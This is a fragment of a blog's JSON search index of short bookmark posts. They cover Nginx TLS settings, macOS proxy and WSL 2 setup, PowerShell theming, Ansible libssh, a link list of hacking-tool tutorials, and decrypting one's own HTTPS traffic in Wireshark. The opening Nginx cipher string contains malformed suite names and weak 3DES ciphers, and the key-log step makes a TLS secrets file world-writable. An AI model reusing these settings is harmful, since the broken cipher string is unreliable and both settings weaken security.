style=\"color:#e6db74\"\u003e\u0026#39;TLS13+AESG+AES128:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES25GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-R-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-S:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_cache\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eshared:SSL:50m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_timeout\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1d\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_session_tickets\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003essl_ecdh_curve\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX25519:sect571r1:secp521r1:secp384r1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Nginx","TLS"],"title":"Nginx SSL/TLS configuration with TLSv1.2 and TLSv1.3 - ECDHE and strong ciphers suite (Openssl 1.1.1)"},{"categories":["URL","MacOS","Zsh"],"contents":" ZSH 自动读取 macOS 系统代理配置并设置环境变量 $ system_profiler SPNetworkDataType # 获取完整网络配置信息 $ networksetup -listallnetworkservices # 列举所有网络设备 $ networksetup -getwebproxy Wi-Fi # 获取特定网络设备的系统代理配置 $ scutil --proxy # 获取当前已启用的代理配置，是对 system_profiler 的封装 ","date":"January 11, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210111-macos-auto-read-proxy-settings-zsh/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\" target=\"_blank\" rel=\"noopener\"\u003eZSH 自动读取 macOS 系统代理配置并设置环境变量\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-zsh\" data-lang=\"zsh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ system_profiler SPNetworkDataType \u003cspan style=\"color:#75715e\"\u003e# 获取完整网络配置信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ networksetup -listallnetworkservices \u003cspan style=\"color:#75715e\"\u003e# 列举所有网络设备\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ networksetup -getwebproxy Wi-Fi \u003cspan style=\"color:#75715e\"\u003e# 获取特定网络设备的系统代理配置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ scutil --proxy \u003cspan style=\"color:#75715e\"\u003e# 获取当前已启用的代理配置，是对 system_profiler 的封装\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","MacOS","Zsh"],"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量"},{"categories":["URL","Windows","WSL"],"contents":" WSL 2 的 .wslconfig 設定檔說明 Release Notes for Windows Subsystem for Linux | Microsoft Docs - Build 18945 在 Windows 10 環境上安裝 WSL 2 使用 WSL 2 打造優質的多重 Linux 開發環境 安裝 WSL 2 的步驟：\n加入 Windows Insider Program（此步驟不可省略） 啟用 WSL 必要元件 安裝 Linux 發行版本 設定 WSL 2 支援的 Linux 發行版本 WSL 2 問題排除：啟用壓縮功能的虛擬磁碟檔案無法轉換成 WSL 2 架構 安裝及啟動 Docker 安裝 Docker Desktop v2.2.1.0 # 啟用 WSL 必要元件 dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart # 設定 WSL 2 支援的 Linux 發行版本 wsl --set-version ubuntu 2 wsl --set-default-version 2 編輯 %UserProfile%\\.wslconfig 檔案\nCommand Prompt\nnotepad %UserProfile%\\.wslconfig Windows PowerShell\nnotepad $env:USERPROFILE\\.wslconfig 設定內容說明\n[wsl2] kernel=\u0026lt;path\u0026gt; # An absolute Windows path to a custom Linux kernel. memory=\u0026lt;size\u0026gt; # How much memory to assign to the WSL2 VM. processors=\u0026lt;number\u0026gt; # How many processors to assign to the WSL2 VM. swap=\u0026lt;size\u0026gt; # How much swap space to add to the WSL2 VM. 0 for no swap file. swapFile=\u0026lt;path\u0026gt; # An absolute Windows path to the swap vhd. localhostForwarding=\u0026lt;bool\u0026gt; # Boolean specifying if ports bound to wildcard or localhost in the WSL2 VM should be connectable from the host via localhost:port (default true). # \u0026lt;path\u0026gt; entries must be absolute Windows paths with escaped backslashes, for example C:\\\\Users\\\\Ben\\\\kernel # \u0026lt;size\u0026gt; entries must be size followed by unit, for example 8GB or 512MB 相關連結\nRelease Notes for Windows Subsystem for Linux | Microsoft Docs - Build 18945 ","date":"December 30, 2020","hero":"/images/hero/microsoft_windows.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201230-e4619f17e8d252b9ff72579ac271881c/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://gist.github.com/doggy8088/e4619f17e8d252b9ff72579ac271881c\" target=\"_blank\" rel=\"noopener\"\u003eWSL 2 的 .wslconfig 設定檔說明\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.microsoft.com/en-us/windows/wsl/release-notes#build-18945\" target=\"_blank\" rel=\"noopener\"\u003eRelease Notes for Windows Subsystem for Linux | Microsoft Docs - Build 18945\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.huanlintalk.com/2020/02/wsl-2-installation.html\" target=\"_blank\" rel=\"noopener\"\u003e在 Windows 10 環境上安裝 WSL 2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.miniasp.com/post/2020/07/26/Multiple-Linux-Dev-Environment-build-on-WSL-2#google_vignette\" target=\"_blank\" rel=\"noopener\"\u003e使用 WSL 2 打造優質的多重 Linux 開發環境\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e安裝 WSL 2 的步驟：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e加入 Windows Insider Program（此步驟不可省略）\u003c/li\u003e\n\u003cli\u003e啟用 WSL 必要元件\u003c/li\u003e\n\u003cli\u003e安裝 Linux 發行版本\u003c/li\u003e\n\u003cli\u003e設定 WSL 2 支援的 Linux 發行版本\u003c/li\u003e\n\u003cli\u003eWSL 2 問題排除：啟用壓縮功能的虛擬磁碟檔案無法轉換成 WSL 2 架構\u003c/li\u003e\n\u003cli\u003e安裝及啟動 Docker\u003c/li\u003e\n\u003cli\u003e安裝 Docker Desktop v2.2.1.0\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 啟用 WSL 必要元件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edism.exe /online /enable-feature /featurename\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e:\u003c/span\u003eMicrosoft-Windows-Subsystem-Linux /all /norestart\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edism.exe /online /enable-feature /featurename\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e:\u003c/span\u003eVirtualMachinePlatform /all /norestart\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 WSL 2 支援的 Linux 發行版本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewsl --set-version ubuntu \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewsl --set-default-version \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e編輯 \u003ccode\u003e%UserProfile%\\.wslconfig\u003c/code\u003e 檔案\u003c/p\u003e","tags":["URL","Windows","WSL"],"title":"WSL 2 的 .wslconfig 設定檔說明"},{"categories":["URL","Network","Route","BGP"],"contents":" Day 19 BGP Protocol (1) Day 20 BGP Protocol (2) ","date":"December 30, 2020","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201230-bgp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10249123\" target=\"_blank\" rel=\"noopener\"\u003eDay 19 BGP Protocol (1)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10249539\" target=\"_blank\" rel=\"noopener\"\u003eDay 20 BGP Protocol (2)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Network","Route","BGP"],"title":"Day 19 BGP Protocol (1)"},{"categories":["URL","Windows","Terminal","PowerShell"],"contents":" 使用 oh-my-posh 美化 PowerShell 樣式 # 這會從 PowerShell Gallery 下載並安裝 posh-git 和 oh-my-posh 這兩個模組，前者是在命令列中顯示 Git 專案的相關資訊，後者則是美美的樣式套件 Install-Module posh-git -Scope CurrentUser Install-Module oh-my-posh -Scope CurrentUser # 接著我們要修改 PowerShell 啟動時所載入的設定檔，在 PowerShell 中輸入 $PROFILE 可得到當前使用者啟動 PowerShell 時，會載入的個人設定檔位置。 # 你的電腦可能沒有這個實體檔案，這時可以執行下面的指令，如果沒有該設定檔，則建立一個，然後使用 notepad 來開啟該設定檔。 if (!(Test-Path -Path $PROFILE )) { New-Item -Type File -Path $PROFILE -Force } notepad $PROFILE 最後在該設定檔中加入下列指令\nImport-Module posh-git Import-Module oh-my-posh Set-Theme Paradox oh-my-posh 內建了很多樣式，你也可以使用 Get-Theme 這個 Cmdlet 指令取得 oh-my-posh 有提供的所有樣式及相關檔案位置\n","date":"December 10, 2020","hero":"/images/hero/microsoft_windows.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201210-setting-powershell-theme-with-oh-my-posh/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.poychang.net/setting-powershell-theme-with-oh-my-posh/\" target=\"_blank\" rel=\"noopener\"\u003e使用 oh-my-posh 美化 PowerShell 樣式\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 這會從 PowerShell Gallery 下載並安裝 posh-git 和 oh-my-posh 這兩個模組，前者是在命令列中顯示 Git 專案的相關資訊，後者則是美美的樣式套件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInstall-Module posh-git -Scope CurrentUser\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInstall-Module oh-my-posh -Scope CurrentUser\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 接著我們要修改 PowerShell 啟動時所載入的設定檔，在 PowerShell 中輸入 $PROFILE 可得到當前使用者啟動 PowerShell 時，會載入的個人設定檔位置。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 你的電腦可能沒有這個實體檔案，這時可以執行下面的指令，如果沒有該設定檔，則建立一個，然後使用 notepad 來開啟該設定檔。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (!(Test-Path -Path $PROFILE )) { New-Item -Type File -Path $PROFILE -Force }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enotepad $PROFILE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最後在該設定檔中加入下列指令\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImport-Module posh-git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImport-Module oh-my-posh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSet-Theme Paradox\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eoh-my-posh 內建了很多樣式，你也可以使用 Get-Theme 這個 Cmdlet 指令取得 oh-my-posh 有提供的所有樣式及相關檔案位置\u003c/p\u003e","tags":["URL","Windows","Terminal","PowerShell"],"title":"使用 oh-my-posh 美化 PowerShell 樣式"},{"categories":["URL","Security"],"contents":" 冰山一角的駭客工具介紹 [駭客工具 Day10] web 安全測試 - Burp Suite [駭客工具 Day11] 網站路徑遍歷 - DirBuster [駭客工具 Day12] 密碼暴力破解 - Hydra [駭客工具 Day13] 密碼字典檔生成工具 - crunch [駭客工具 Day16] 滲透神器 - Metasploit [駭客工具 Day18] windows 密碼獲取神器 - mimikatz [駭客工具 Day25] CTF Exploit 的 Python library - pwntools ","date":"December 8, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201208-2536/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/users/20114110/ironman/2536\" target=\"_blank\" rel=\"noopener\"\u003e冰山一角的駭客工具介紹\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10214839\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day10] web 安全測試 - Burp Suite\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10215002\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day11] 網站路徑遍歷 - DirBuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10215072\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day12] 密碼暴力破解 - Hydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10215234\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day13] 密碼字典檔生成工具 - crunch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10216722\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day16] 滲透神器 - Metasploit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10217688\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day18] windows 密碼獲取神器 - mimikatz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10221189\" target=\"_blank\" rel=\"noopener\"\u003e[駭客工具 Day25] CTF Exploit 的 Python library - pwntools\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Security"],"title":"冰山一角的駭客工具介紹"},{"categories":["URL","Windows","Vagrant"],"contents":" Provisioning a Windows Server Vagrant box with IIS, .NET 4.5 and Octopus Deploy How to use a powershell script during vagrant up on host correctly? First steps with Windows on Vagrant https://followkman.com/2016/07/27/vagrant-up-on-windows-10-with-hyper-v/ ","date":"December 3, 2020","hero":"/images/hero/microsoft_windows.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201203-provisioning-a-windows-server-vagrant-box-with-iis-net-4-5-and-octopus-deploy/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://kwilson.io/blog/provisioning-a-windows-server-vagrant-box-with-iis-net-4-5-and-octopus-deploy/\" target=\"_blank\" rel=\"noopener\"\u003eProvisioning a Windows Server Vagrant box with IIS, .NET 4.5 and Octopus Deploy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://stackoverflow.com/questions/64242931/how-to-use-a-powershell-script-during-vagrant-up-on-host-correctly\" target=\"_blank\" rel=\"noopener\"\u003eHow to use a powershell script during vagrant up on host correctly?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://akrabat.com/first-steps-with-windows-on-vagrant/\" target=\"_blank\" rel=\"noopener\"\u003eFirst steps with Windows on Vagrant\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://followkman.com/2016/07/27/vagrant-up-on-windows-10-with-hyper-v/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://followkman.com/2016/07/27/vagrant-up-on-windows-10-with-hyper-v/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Windows","Vagrant"],"title":"Provisioning a Windows Server Vagrant box with IIS, .NET 4.5 and Octopus Deploy"},{"categories":["URL","Ansible","SSH"],"contents":" New LibSSH Connection Plugin for Ansible Network Replaces Paramiko, Adds FIPS Mode Enablement Switching Ansible Playbooks to use LibSSH # Installing LibSSH pip install ansible-pylibssh Using LibSSH in Ansible Playbooks\nMethod 1. The ssh_type configuration parameter can be set to use libssh in the active ansible.cfg file of your project\n[persistent_connection] ssh_type = libssh Method 2: Set the ANSIBLE_NETWORK_CLI_SSH_TYPE environment variable\n$ export ANSIBLE_NETWORK_CLI_SSH_TYPE=libssh Method 3: Set the ansible_network_cli_ssh_type parameter to libssh within your playbook at the play level\nPlaybook to test libssh configuration settings - hosts: \u0026#34;changeme\u0026#34; gather_facts: no connection: ansible.netcommon.network_cli vars: ansible_network_os: cisco.ios.ios ansible_user: \u0026#34;changeme\u0026#34; ansible_password: \u0026#34;changeme\u0026#34; ansible_network_cli_ssh_type: libssh tasks: - name: run show version command ansible.netcommon.cli_command: command: show version - name: run show version command ansible.netcommon.cli_command: command: show interfaces ","date":"November 25, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201125-new-libssh-connection-plugin-for-ansible-network/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.ansible.com/blog/new-libssh-connection-plugin-for-ansible-network\" target=\"_blank\" rel=\"noopener\"\u003eNew LibSSH Connection Plugin for Ansible Network Replaces Paramiko, Adds FIPS Mode Enablement\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"switching-ansible-playbooks-to-use-libssh\"\u003eSwitching Ansible Playbooks to use LibSSH\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Installing LibSSH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epip install ansible-pylibssh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUsing LibSSH in Ansible Playbooks\u003c/p\u003e\n\u003cp\u003eMethod 1. The \u003ccode\u003essh_type\u003c/code\u003e configuration parameter can be set to use libssh in the active \u003ccode\u003eansible.cfg\u003c/code\u003e file of your project\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-toml\" data-lang=\"toml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[\u003cspan style=\"color:#a6e22e\"\u003epersistent_connection\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003essh_type\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003elibssh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eMethod 2: Set the \u003ccode\u003eANSIBLE_NETWORK_CLI_SSH_TYPE\u003c/code\u003e environment variable\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ export ANSIBLE_NETWORK_CLI_SSH_TYPE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003elibssh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eMethod 3: Set the \u003ccode\u003eansible_network_cli_ssh_type\u003c/code\u003e parameter to libssh within your playbook at the play level\u003c/p\u003e","tags":["URL","Ansible","SSH"],"title":"New LibSSH Connection Plugin for Ansible Network Replaces Paramiko, Adds FIPS Mode Enablement"},{"categories":["URL","Synology","Linux","NAS"],"contents":" CentOS 7 掛載 Synology NAS 資料夾 ","date":"November 9, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201109-145053/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dotblogs.com.tw/zerroyuy/2020/08/20/145053\" target=\"_blank\" rel=\"noopener\"\u003eCentOS 7 掛載 Synology NAS 資料夾\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Synology","Linux","NAS"],"title":"CentOS 7 掛載 Synology NAS 資料夾"},{"categories":["URL","MacOS"],"contents":" MacBook 设置 SSLKEYLOGFILE 环境变量解密 HTTPS 流量 创建 keylogfile\nmkdir ~/sslkeylogfile \u0026amp;\u0026amp; touch ~/sslkeylogfile/keylogfile.log # 创建 keylogfile.log 文件 sudo chmod 777 ~/sslkeylogfile/keylogfile.log # 更改权限，确保 chrome 启动时能写入数据 配置环境变量\nvim ~/.zshrc # 打开配置文件 export SSLKEYLOGFILE=~/sslkeylogfile/keylogfile.log # 配置环境变量 source ~/.zshrc # 使配置文件生效 配置 wireshark\nperferences -\u0026gt; Protocols -\u0026gt; TLS\n配置 TSL debug file 记录解密日志 配置 (Pre)-Master-Secret log filename 路径为 keylogfile.log 的绝对路径 使用 termial 启动 chrome\nopen -a \u0026#39;Google Chrome\u0026#39; https://www.baidu.com/ 注意：从 termial 启动 chrome，为了确保 chrome 可以读取 SSLKEYLOGFILE 环境变量。\n","date":"November 6, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201106-sslkeylog/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.luwenpeng.cn/2020/04/29/MacBook%E8%AE%BE%E7%BD%AESSLKEYLOGFILE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%A7%A3%E5%AF%86HTTPS%E6%B5%81%E9%87%8F/\" target=\"_blank\" rel=\"noopener\"\u003eMacBook 设置 SSLKEYLOGFILE 环境变量解密 HTTPS 流量\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e创建 keylogfile\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir ~/sslkeylogfile \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e touch ~/sslkeylogfile/keylogfile.log \u003cspan style=\"color:#75715e\"\u003e# 创建 keylogfile.log 文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chmod \u003cspan style=\"color:#ae81ff\"\u003e777\u003c/span\u003e ~/sslkeylogfile/keylogfile.log \u003cspan style=\"color:#75715e\"\u003e# 更改权限，确保 chrome 启动时能写入数据\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置环境变量\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evim ~/.zshrc \u003cspan style=\"color:#75715e\"\u003e# 打开配置文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexport SSLKEYLOGFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e~/sslkeylogfile/keylogfile.log \u003cspan style=\"color:#75715e\"\u003e# 配置环境变量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esource ~/.zshrc \u003cspan style=\"color:#75715e\"\u003e# 使配置文件生效\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置 wireshark\u003c/p\u003e\n\u003cp\u003eperferences -\u0026gt; Protocols -\u0026gt; TLS\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e配置 TSL debug file 记录解密日志\u003c/li\u003e\n\u003cli\u003e配置 (Pre)-Master-Secret log filename 路径为 keylogfile.log 的绝对路径\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e使用 termial 启动 chrome\u003c/p\u003e\n\u003cdiv 